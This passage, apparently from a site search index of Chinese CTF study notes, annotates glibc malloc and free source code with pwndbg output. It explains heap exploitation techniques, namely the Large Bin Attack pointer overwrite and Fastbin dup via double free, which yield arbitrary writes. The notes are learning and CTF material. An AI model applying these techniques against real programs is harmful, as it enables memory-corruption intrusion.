然后构造目标地址+0x18位置的地址为victim的地址 即可完成劫持 我们就可以malloc一个\",\"img\"]},\"307\":{\"h\":\"large Bin Attack学习（_int_malloc源码细读 ）\",\"t\":[\"参考文章:wiki:Large Bin Attack - CTF Wiki (ctf-wiki.org)源码级调试glibc:源码级调试glibc_glibc cannot be compiled without optimization-CSDN博客源码分析:glibc 2.31 malloc与free 源码分析（持续更新） - PwnKi - 博客园 (cnblogs.com)+glibc malloc源码分析 - PwnKi - 博客园 (cnblogs.com)详细拆分了_int_malloc的流程 并且按照功能分了标题 想要了解对应部分就直接点击标题跳转即可第一次阅读glibc的源码然后进行分析 有错误的地方请大佬指正\"]},\"308\":{\"h\":\"源码分析(largebin malloc)\",\"t\":[\"每次去看别人文章分析总结的 总感觉比较难记住 每个libc版本的区别 然后也没彻底理解一些操作 所以进行阅读源码\",\"然后重点是检查机制部分 如果只想看重点就直接跳转到largebin入链操作\",\"然后在正式阅读源码之前 我们先理清楚largebin的结构（去除了头部的fd_nextsize/bk_nextsize 为了图片干净一点）\",\"largebin_struct\",\"我们可以简化一下 去除尾链的fd和头链的bk方便我们理清逻辑\",\"large_struct\",\"大概就是这个样子 也就是bin头部通过fd/bk链接chunk size链表的头部和尾部 然后chunk size链表之间通过fd_nextsize/bk_nextsize链接\",\"chunksize链表中 同一个大小的chunk通过fd/bk进行链接\",\"所以largebin的fd和bk和其他的双向链不同我们不能通过从bin一路通过fd返回到large bin的头部\"]},\"309\":{\"h\":\"Unsortedbin的合并/入链/分配操作\"},\"310\":{\"h\":\"遍历的开始（梦的开始）\",\"t\":[\"后面的操作中最重要的就是Victim变量 这个变量是当前循环到的unsortedbin chunkbck变量 也就是bck <-------> victim 这个关系\",\"从unsorted_chunk最后一位开始遍历 直到碰到unsorted_bin的头部 我在这里 没很确定是否unsortedbin可不可以指向自己 我们可以调试看看\",\"while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)){ bck = victim->bk; size = chunksize (victim); /* 计算 size */ // ... } \"]},\"311\":{\"h\":\"调试\",\"t\":[\"unsortedbin all: 0x555555559680 —▸ 0x7ffff7fb9be0 (main_arena+96) ◂— 0x555555559680 \",\"然后查看chunk结构\",\"Free chunk (unsortedbin) | PREV_INUSE Addr: 0x555555559680 Size: 0x90 (with flag bits: 0x91) fd: 0x7ffff7fb9be0 bk: 0x7ffff7fb9be0 \",\"查看unsortedbin的大小\",\"pwndbg> tel 0x7ffff7fb9be0 00:0000│ rdx r10 r11 0x7ffff7fb9be0 (main_arena+96) —▸ 0x5555555597a0 ◂— 0x0 01:0008│ 0x7ffff7fb9be8 (main_arena+104) ◂— 0x0 02:0010│ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 03:0018│ 0x7ffff7fb9bf8 (main_arena+120) —▸ 0x555555559680 ◂— 0x0 04:0020│ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 05:0028│ 0x7ffff7fb9c08 (main_arena+136) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 06:0030│ 0x7ffff7fb9c10 (main_arena+144) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 07:0038│ 0x7ffff7fb9c18 (main_arena+152) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 \",\"可以发现fd bk都是指向的unsortedbin中第一个chunk 我们清空unsortedbin看看\",\"pwndbg> tel 0x7ffff7fb9be0 00:0000│ rsi r11 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 01:0008│ 0x7ffff7fb9be8 (main_arena+104) —▸ 0x555555559710 ◂— 0x90 02:0010│ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 03:0018│ 0x7ffff7fb9bf8 (main_arena+120) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 04:0020│ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 05:0028│ 0x7ffff7fb9c08 (main_arena+136) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 06:0030│ 0x7ffff7fb9c10 (main_arena+144) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— ... 07:0038│ 0x7ffff7fb9c18 (main_arena+152) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x55555555983 \",\"我们会发现fd和bk都是指向了自己本身也就是main_arena+96这个位置\"]},\"312\":{\"h\":\"安全检查机制\",\"t\":[\"这里的安全机制全是对unsortedbin中的chunk进行的检查\",\"不能小于2*SIZE_SZ不能大于av->system_men也就是该分配去的内存分配总量\",\"if (__glibc_unlikely (size <= 2 * SIZE_SZ) || __glibc_unlikely (size > av->system_mem)) malloc_printerr (\\\"malloc(): invalid size (unsorted)\\\"); \",\"对next chunk(物理意义上的紧挨着)也进行一样的操作\",\"mchunkptr next = chunk_at_offset (victim, size); /* 获得指向内存空间中当前 chunk 的下一个chunk 的指针 */\",\"if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)|| __glibc_unlikely (chunksize_nomask (next) > av->system_mem)) malloc_printerr (\\\"malloc(): invalid next size (unsorted)\\\"); \",\"检查next chunk的prev_size 是否等于当前的chunk size\",\"size = chunksize (victim); /* 计算 size */\",\"/* 如果 next chunk 中记录前一个 chunk 大小的 prev_size 与 size 不符，则报错 */ if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size)) malloc_printerr (\\\"malloc(): mismatching next->prev_size (unsorted)\\\"); \",\"检查bck的fd是否为当前chunk 或者当前chunk的fd是否是bin的头结点\",\"bck = victim->bk;\",\"victim = unsorted_chunks (av)->bk)\",\"应该就是检查下一个chunk是否是合法的\",\"if (__glibc_unlikely (bck->fd != victim) || __glibc_unlikely (victim->fd != unsorted_chunks (av))) malloc_printerr (\\\"malloc(): unsorted double linked list corrupted\\\"); \",\"检查当前chunk是否是free的 通过next chunk的p值\",\" /* 如果 next chunk 中的显示前一个 chunk 是否正在使用的标志位为1，*/ /* 即前一个 chunk 正在使用，则报错 */ if (__glibc_unlikely (prev_inuse (next))) malloc_printerr (\\\"malloc(): invalid next->prev_inuse (unsorted)\\\"); \"]},\"313\":{\"h\":\"直接返回smallbin_chunk情况\",\"t\":[\"然后就是从unsortedbin割small chunk 如果符合条件\",\"所需chunk大小在smallbin的范围之内\",\"bck为unsortedbin的头 也就是unsortedbin中仅有一个chunk\",\"victim为last remainder chunk 也就是分割过一次\",\"大小刚好大于所需nb大小+Minsize(这里猜测就是一个最小chunk 这样才能切割)\",\"满足以上条件 就直接分割 然后将victim返回给用户\",\"if (in_smallbin_range (nb) && bck == unsorted_chunks (av) && victim == av->last_remainder && (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder; av->last_remainder = remainder; remainder->bk = remainder->fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)){ remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } \"]},\"314\":{\"h\":\"从unsortedbin中移除\",\"t\":[\"在这里已经将chunk从unsortdbin中移除\",\" unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); \"]},\"315\":{\"h\":\"大小刚好相等情况\",\"t\":[\"如果chunk和当前需要的chunk大小一致 则直接返回chunk 并且设置物理意义上紧挨着的下一个chunk的size中p为0也就是free状态\",\"set_inuse_bit_at_offset (victim, size); \",\"如果开启了tcache机制 且tcache未满则将chunk放入tcache中\",\"if (tcache_nb && tcache->counts[tc_idx] < mp_.tcache_count){ tcache_put (victim, tc_idx); return_cached = 1; continue; } \",\"然后直接返回\",\"check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; /* 返回内存指针 */ \"]},\"316\":{\"h\":\"归类入链操作\",\"t\":[\"这里主要是将unsortedbin合并后的 入small链表或者large链表的操作\",\"这里的fwd和bck记好了 我们从unsortedbin抠出来的chunk就要合并进入fwd和bck的中间\",\"这后面的操作往往是先让fwd到指定的位置 然后bck通过fwd->bk来进行的定位\"]},\"317\":{\"h\":\"small 和 large最终入bin操作\",\"t\":[\"这里把最后的部分 直接提前 拿出来 因为smallbin和largebin的入链操作都含这个代码\",\"largebin还有chunk size的入链操作 以及其他的复杂检查\",\"mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \"]},\"318\":{\"h\":\"smallbin的fwd bck赋值\",\"t\":[\"如果属于small bin则进行fwd和bck的赋值\",\"small bin 的链表表头赋值给 bck:bck = bin_at (av, victim_index);\",\"首个chunk赋值给fwd :fwd = bck->fd;\",\"if (in_smallbin_range (size)){ victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; } \"]},\"319\":{\"h\":\"largebin 入bin链和chunk size链\",\"t\":[\"如果属于large_bins同理进行赋值 然后判断该插入什么合适的位置\",\"因为largebin是按照大小进行的排序 由大到小 所以最小的在链表最后\",\"victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; \",\"判断large是否有空闲chunk:\",\"if (fwd != bck) \",\"如果当前chunk比最后一位chunk还小则直接加入链表末尾\",\"bck是头 bck->bk应该就是最后一位\",\"然后要加入fwd和bck之间 我们应该先调整fwd和bck 所以bck改为链表最后一位 fwd改为链表头\",\"bck<----->chunk<----->fwd\",\"if ((unsigned long) (size)< (unsigned long) chunksize_nomask (bck->bk)){ fwd = bck; bck = bck->bk; victim->fd_nextsize = fwd->fd; victim->bk_nextsize = fwd->fd->bk_nextsize; fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; } \",\"否则进行遍历判断 匹配第一个小于等于 当前chunk的\",\"while ((unsigned long) size < chunksize_nomask (fwd)){ fwd = fwd->fd_nextsize; assert (chunk_main_arena (fwd)); } \",\"如果该chunk与当前chunk相同则让chunk插入fwd之后 所以\",\"因为large bin是按照大小进行的排序 所以我们为了不额外修改chunk size链表 直接将chunk链接到fwd后面\",\"if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd)) fwd = fwd->fd; \",\"当我们需求的chunk size大于large中所有的chunk size的情况 执行largebin的入chunk_size链操作:\",\"这里我理解的是largebin存在两条链 也就是chunk size的链 和fd bk构成的bins链 这里先是入的chunk size的链\",\"victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (nextsize)\\\"); fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; \",\"这里就是重点了 也就是large bin的入链操作\",\"首先这是初始状态\",\"让bck等于fwd->bk 也就是把bck提到fwd前方 并且进行安全检查\",\"bck = fwd->bk; if (bck->fd != fwd) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (bk)\\\"); \",\"最后就是执行入链操作了\",\"在一开始的时候提过\",\"mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \"]},\"320\":{\"h\":\"从largebin中获取chunk\",\"t\":[\"largebin情况\",\"if (!in_smallbin_range (nb)) \"]},\"321\":{\"h\":\"chunk脱链 remainder chunk入链\",\"t\":[\"首先是判断情况 我们只处理这一种情况:largebin中有chunk 然后largebin中最大的chunk大于我们的需求\",\"接下来的代码都是从largebin中获取chunk\",\"if ((victim = first (bin)) != bin && (unsigned long) chunksize_nomask (victim)>= (unsigned long) (nb)) \",\"取最小的chunk 反方向循环 找到刚好大于等于我们所需chunk size的 chunk\",\"如果一个大小的chunk链表中有多个chunk 优先取第二个 不轻易改变chunk size链表的值\",\"// 取largebin的最后一个chunk 也就是最小的那个chunk victim = victim->bk_nextsize; // 取首个大于所需的chunk size的large chunk while (((unsigned long) (size = chunksize (victim)) < (unsigned long) (nb))) victim = victim->bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // 这里避免删除chunk size链中的首个chunk 避免我们修改chunk size链表 所以我们取第二个 if (victim != last (bin) && chunksize_nomask (victim) == chunksize_nomask (victim->fd)) victim = victim->fd; \",\"chunk 通过unlink脱链 remainder chunk入unsortedbin链\",\"安全检查 是否切割后的chunk大于minsize 与安全检查 largebin第一个chunk和头的互锁状态\",\" // 算剩余的remainder_size remainder_size = size - nb; // 对 我们large bin中的chunk 进行unlink操作 unlink_chunk (av, victim); /* Exhaust */ // 安全检查 如果切割的chunk 小于Minsize 则 设置下一个chunk p为0 if (remainder_size < MINSIZE){ set_inuse_bit_at_offset (victim, size); if (av != &main_arena) set_non_main_arena (victim); }else{ remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // 根据注释大概知道是进行完整的插入操作 // 取得unsorted_chunk bin链表的的头 bck = unsorted_chunks(av); // 取 第一个chunk fwd = bck->fd; // 安全检查:检查第一个chunk的bk是否为unsorted bin的头 if (__glibc_unlikely (fwd->bk != bck)){ malloc_printerr (\\\"malloc(): corrupted unsorted chunks\\\"); } // remainder 入unsortedbin remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; // 如果是remiander 则将fd_nextsize bk_nextsize 设置为null if (!in_smallbin_range (remainder_size)){ remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // 这里应该是设置head的一系列操作 set_head (victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); // foot就是下一个chunk的prev_size部分 set_foot (remainder, remainder_size); } \"]},\"322\":{\"h\":\"返回被切割后的chunk\",\"t\":[\"check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; \"]},\"323\":{\"h\":\"从topchunk中获取chunk\",\"t\":[\"我是大概浏览的 大概意思是去剩下的chunk中寻找 如果没找到就去topchunk分配 如果topchunk不够就去系统申请\"]},\"324\":{\"h\":\"_int_free_源码\",\"t\":[\" static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ // 获取size大小 size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \\\"design\\\" from some intruder. */ if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr (\\\"free(): invalid pointer\\\"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // 要大于MINSIZE 以及内存对齐? if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size))) malloc_printerr (\\\"free(): invalid size\\\"); check_inuse_chunk(av, p); #if USE_TCACHE { size_t tc_idx = csize2tidx (size); if (tcache && tc_idx < mp_.tcache_bins && tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (p, tc_idx); return; } } #endif /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ // 如果是fastbin区间的 if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ && (chunk_at_offset(p, size) != av->top) #endif ) { // chunk的size值 得大于chunk最小值 得小于该区域分配的最大size if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<= 2 * SIZE_SZ, 0)|| __builtin_expect (chunksize (chunk_at_offset (p, size))>= av->system_mem, 0)){ bool fail = true; /* We might not have a lock at this point and concurrent modifications of system_mem might result in a false positive. Redo the test after getting the lock. */ if (!have_lock){ __libc_lock_lock (av->mutex); fail = (chunksize_nomask (chunk_at_offset (p, size)) <= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) >= av->system_mem); __libc_lock_unlock (av->mutex); } if (fail) malloc_printerr (\\\"free(): invalid next size (fast)\\\"); } // 清空chunk中除了prev_size 和size的地方 free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); atomic_store_relaxed (&av->have_fastchunks, true); // 获取对应fastbin链 unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // 将块 P 插入到 fastbin 中。首先，它将当前 fastbin 的头部指针的值赋给块 P 的 FD 字段 mchunkptr old = *fb, old2; if (SINGLE_THREAD_P){ /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // 检查fastbin的头部chunk是否为当前free的chunk if (__builtin_expect (old == p, 0)) malloc_printerr (\\\"double free or corruption (fasttop)\\\"); // p->old p->fd = old; *fb = p; }else do{ /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\\\"double free or corruption (fasttop)\\\"); p->fd = old2 = old; }while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been allocated again. */ if (have_lock && old != NULL&& __builtin_expect (fastbin_index (chunksize (old)) != idx, 0)) malloc_printerr (\\\"invalid fastbin entry (free)\\\"); } /* Consolidate other non-mmapped chunks as they arrive. */ // 如果释放的chunk不属于fastbin 且不是mmap分配的 就获取下一个chunk的指针 nextchunk和nextsize // 如果前一个chunk空闲 就合并 通过unlink将该chunk脱离出来 // 如果取出来的chunk下一个chunk也是free chunk 且不为top chunk 则也设置为空闲 // 去除unsortedbin头指针 将合并后的chunk 塞入unsortedbin中 // 如果为top chunk则直接合并 else if (!chunk_is_mmapped(p)) { /* If we're single-threaded, don't lock the arena. */ if (SINGLE_THREAD_P) have_lock = true; if (!have_lock) __libc_lock_lock (av->mutex); nextchunk = chunk_at_offset(p, size); /* Lightweight tests: check whether the block is already the top block. */ // 检查是否等于头一个chunk if (__glibc_unlikely (p == av->top)) malloc_printerr (\\\"double free or corruption (top)\\\"); /* Or whether the next chunk is beyond the boundaries of the arena. */ // 查看下一个chunk是否大于整个内存空间的边界 if (__builtin_expect (contiguous (av) && (char *) nextchunk >= ((char *) av->top + chunksize(av->top)), 0)) malloc_printerr (\\\"double free or corruption (out)\\\"); /* Or whether the block is actually not marked used. */ // 如果通过nextchunk查看下一个chunk是free状态 也就是当前我们要free的chunk 是free状态 则报错double free if (__glibc_unlikely (!prev_inuse(nextchunk))) malloc_printerr (\\\"double free or corruption (!prev)\\\"); // 获取物理上下一个chunk的大小 nextsize = chunksize(nextchunk); // 进行2*size+sz<size<system_mem的传统检查 if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize >= av->system_mem, 0)) malloc_printerr (\\\"free(): invalid next size (normal)\\\"); // 清空要free的chunk free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); // 如果当前chunk的p为0也就是下一个chunk为freechunk则进行合并 /* consolidate backward */ if (!prev_inuse(p)) { // 获取prev_size作为上一个chunk的size大小 prevsize = prev_size (p); // size+prevsize也就是新的chunk的大小 size += prevsize; // 获取上一个chunk的头指针 p = chunk_at_offset(p, -((long) prevsize)); // 进行unlink操作 unlink(av, p, bck, fwd); } // 如果下一个chunk不为top chunk // 下一个chunk也是free chunk 则继续进行合并 if (nextchunk != av->top) { /* get and clear inuse bit */ // 应该是根据指针 和size 算出下一个chunk的size p位置 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* consolidate forward */ if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } else // 设置nextchunk size p 的部分清空 clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck->fd; // 检查unsortedbin是否合法 if (__glibc_unlikely (fwd->bk != bck)) malloc_printerr (\\\"free(): corrupted unsorted chunks\\\"); // p入unsortedbin链 p->fd = fwd; p->bk = bck; // 属于largebin大小则设置fd_nextsize bk_nextsize为null if (!in_smallbin_range(size)){ p->fd_nextsize = NULL; p->bk_nextsize = NULL; } // 正式入链 bck->fd = p; fwd->bk = p; //正常设置size 和foot set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* If the chunk borders the current high end of memory, consolidate into top */ else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) { if (atomic_load_relaxed (&av->have_fastchunks)) malloc_consolidate(av); if (av == &main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av->top)) >= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap->ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) __libc_lock_unlock (av->mutex); } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } \"]},\"325\":{\"h\":\"漏洞利用\",\"t\":[\"我们主要是利用:largechunk中最大的chunk还是小于我们所需求的chunk大小这种情况 我们来详细分析一下这个流程中究竟干了什么\",\"victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (nextsize)\\\"); fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; // 以及 victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \",\"我们可以发现 这里的代码 危险的地方在于 如果现在我们能够修改largebin中fwd位置的chunk 我们就能够泄露victim的地址\",\"我们主要利用这两行代码\",\"victim->bk_nextsize->fd_nextsize = victim; bck->fd = victim; \",\"如何实现？比如\",\"我们修改largebin中的chunk 也就是fwd的bk为我们想要泄露到的目标地址-0x10时 \",\"所以fwd->bk->fd也就是目标地址\",\"阅读前后逻辑我们知道这段代码中bck=fwd->bk\",\"bck->fd 最后被赋值victim\",\"所以也就是fwd->bk->fd被赋值victim 也就是目标地址赋值victim\",\"我们修改fwd的bk_nextsize为目标地址-0x20\",\"所以fwd->bk_nextsize->fd_nextsize等于目标地址\",\"然后也因为victim->bk_nextsize = fwd->bk_nextsize; 和victim->bk_nextsize->fd_nextsize = victim所以等价替换\",\"fwd->bk_nextsize->fd_nextsize=victim也就是目标地址等于victim\"]},\"326\":{\"h\":\"深入学习堆结构\",\"t\":[\"做hgame的时候 有点做不动heap的题 所以来学习一下基本功学习文章:【pwn】学pwn日记（堆结构学习）（随缘更新）_pwn 堆特性-CSDN博客\"]},\"327\":{\"h\":\"堆管理器\",\"t\":[\"在linux中 堆管理器 由libc.so.6链接库实现\",\"brk\",\"mmap\",\"brk函数\",\"申请小的内存空间 从heap下方的data段 向上申请内存\",\"mmap函数\",\"一般申请较大的内存空间 从shared libraries里面开新的空间\",\"子线程只能用mmap函数\"]},\"328\":{\"h\":\"流程\",\"t\":[\"用户使用malloc函数向堆管理器申请一块内存空间\",\"堆管理器用brk或者mmap函数去获取内存\"]},\"329\":{\"h\":\"chunk结构\",\"t\":[\"完整的chunk 一般是prev_size ,size(含AMP),fd, bk, fd,_nextsize,bk,_nextsize这几个组成\",\"需要注意的是 prev_size有且仅当 上一个chunk处于free状态的时候来表示 上一个chunk的大小否则 就作为上一个chunk的一部分来存数据\",\"chunk_struct\",\"alloced chunk 由于是使用状态所以 在使用的就只有prev_size 和size两个部分\",\"alloced_chunk\",\"free chunk常见的就是携带fd 和bk 然后当p为0的时候 两个chunk会合并为一个较大的chunk\",\"fast bin的chunk\",\"保留最基本结构 最简单的结构 也就是 prev_size+size+fd+data 所以 fastbin最小结构为0x20 也就是4* 0x8(64位)\",\"top chunk 也就是一个超大的chunk 用户申请内存的时候 会先搜索bins 然后再搜索top chunk实在不够才会去调用brk函数申请空间 然后再从top chunk中申请\"]},\"330\":{\"h\":\"申请内存的过程\",\"t\":[\"这里原文章讲特别好 我直接copy了(虽然之前也是copy)\",\"申请内存<64bytes 则从tcachebin(tcachebin 从glibc2.26引入),fast bins或者smallbin找\",\"申请内存 >64bytes 则从unsorted bin找\",\"unsorted bin无和是bin则遍历unsorted bin合并free chunk 然后找 如果有合适的就直接给 否则将合并后的放入对应bin\",\"去large bin找\",\"向top chunk中找\",\"brk函数申请 然后从top chunk中找\",\"mmap函数 申请 然后从top chunk中找\",\"当我们申请0xn0和0xn8内存大小的时候 系统其实给我们的是一样的chunk大小 因为我们可以利用下一面一个chunk的prev_size的空间 刚好0x8的空间(64位)\"]},\"331\":{\"h\":\"NTUSTISC - Pwn 2学习笔记\",\"t\":[\"查看glibc的源码网址:https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c\"]},\"332\":{\"h\":\"TSL 了解\"},\"333\":{\"h\":\"gdb 如何查 fs？\",\"t\":[\"print (void)arch_prctl(option_num,addr) \",\"option_num 是决定是我们的操作 比如0x1003就是取fs的值\",\"addr就是取fs放在什么地方\",\"pwngdb的话直接输入tls也可以查到\"]},\"334\":{\"h\":\"bin\"},\"335\":{\"h\":\"free 源码分析\",\"t\":[\"运行_int_free函数\",\"如果size小于get_max_fast()就进入fastbin\",\"通过fastbin_index(size)获取对应大小的fastbin\",\"fastbin(av,idx)获取fastbin的位置\",\"然后chunk入链\"]},\"336\":{\"h\":\"malloc源码分析\",\"t\":[\"运行_int_malloc函数\",\"先获取我们真正需要的 chunk 大小\",\"判断是否是fastbin范围\",\"获取对应大小的fastbin然后获取位置\",\"然后 chunk出链\"]},\"337\":{\"h\":\"Fastbin\",\"t\":[\"fd指向下一个free chunk的chunk head(也就是下一个free的chunk)\",\"不去修改p\"]},\"338\":{\"h\":\"Tcache\",\"t\":[\"从libc2.26开始引入\",\"从0x20到0x410\",\"每个tcache最多收取7个chunk\",\"用结构tcache_perthread_struct管理tcache\",\"存在于TLS\",\"一共两个部分 一个是对应大小的tcache bin的链表(每个最多存7个chunk) 一个是对应链表的元素数量\",\"chunk的bk是一串随机的安全数 防止double free的\",\"fd指向的是 下一个free chunk的mem(也就是payload的部分)\"]},\"339\":{\"h\":\"Fastbin dup\",\"t\":[\"算是一个正式的攻击手段\",\"利用double free让整个链表陷入循环\",\"比如现在fastBin->chunk1->chunk2 然后此时chunk1的fd指向chunk2然后我们再次free chunk2那么chunk2的fd指向chunk1就会变成:fastBin->chunk2->chunk1->chunk2->chunk1的死循环\",\"然后我们malloc一下 获取了chunk2然后此时链表:fastbin->chunk1->chunk2->chunk1...\",\"然后我们修改chunk2fd指向我们想要修改的地方 那么链表:fastbin->chunk1->chunk2->addr_we_want\",\"那么我们malloc三次获取我们想要的地址的读写权\",\"记住是我们想要写入地址-0x10 因为还有prev_size+size\",\"然后根据源码 我们可以知道\",\"size检查\",\"我们的size得>=2*SIZE_SZ然后必须<=av->system_mem\",\" if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); mutex_lock(&av->mutex); locked = 1; chunk_at_offset (p, size)->size <= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) >= av->system_mem; })) { errstr = \\\"free(): invalid next size (fast)\\\"; goto errout; } if (! have_lock) { (void)mutex_unlock(&av->mutex); locked = 0; } } \",\"检查double chunk\",\"仅仅是检查bin中第一个chunk是否是相同的chunk\",\"free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \\\"double free or corruption (fasttop)\\\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it 